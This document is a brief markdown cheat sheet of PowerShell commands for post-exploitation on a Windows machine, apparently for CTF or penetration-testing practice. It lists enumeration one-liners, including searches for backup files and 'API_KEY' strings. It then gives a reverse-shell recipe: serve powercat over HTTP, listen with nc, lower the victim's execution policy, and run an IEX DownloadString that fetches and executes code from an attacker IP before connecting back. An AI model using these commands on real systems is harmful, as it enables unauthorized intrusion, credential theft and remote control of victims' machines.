# Enumeration

The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:
- users:
  - Get-LocalUser
  - (Get-LocalUser).Name
  - (Get-LocalUser).Name.Count
  - Get-LocalUser -SID "sid_value"
  - Get-LocalUser | Where-Object -Property PasswordRequired -Match false
  - Get-LocalGroup | measure
- basic networking information:
  - Get-NetIPAddress
  - Get-NetTCPConnection | Where-Object -Property State -Match Listen | measure
  - get-nettcpconnection | where {$_.state -eq "listen" -and $_.localport -eq 445}
  - Get-NetRoute
  - Get-NetAdapter -Name * -IncludeHidden
  - Get-NetAdapter -Name * -Physical
- file permissions:
  - Get-ChildItem -Path C:\ -Include *\.bak*\ -File -Recurse -ErrorAction SilentlyContinue
  - Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY
  - Get-Acl C:\ | Format-List
  - Get-ChildItem C:\ -Recurse | Get-Acl | Select-Object PSChildName, AccessToString | Format-List
- registry permissions:
  - Get-Acl "HKLM:\Software" | Format-List
  - Get-Hotfix
  - Get-Hotfix -Id KB4023834
- scheduled and running tasks:
  - Get-Process
  - Get-ScheduledTask -TaskName * | Format-List
  - Get-ScheduledTask | Where-Object {$_.State -eq "Running"}
  - get-scheduledtask | where {$_.taskname -eq "new-sched-task"}
- insecure files:
  - Get-ChildItem -Recurse C:\ | Get-Acl | Where-Object {($_.AccessToString -match "Everyone") -and ($_.AccessToString -match "FullControl")}
 
# Reverse Shell

Attacker's Machine:
- git clone https://github.com/besimorhino/powercat && cd powercat
- python3 -m http.server 8080
- nc -lvnp 1337
Victim's Machine:
- Execution Policy:
  - Get-ExecutionPolicy
  - Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
- Download and execute payload:
  - IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker's IP]:8080/powercat.ps1'); powercat -c [Attacker's IP] -p 1337 -ep

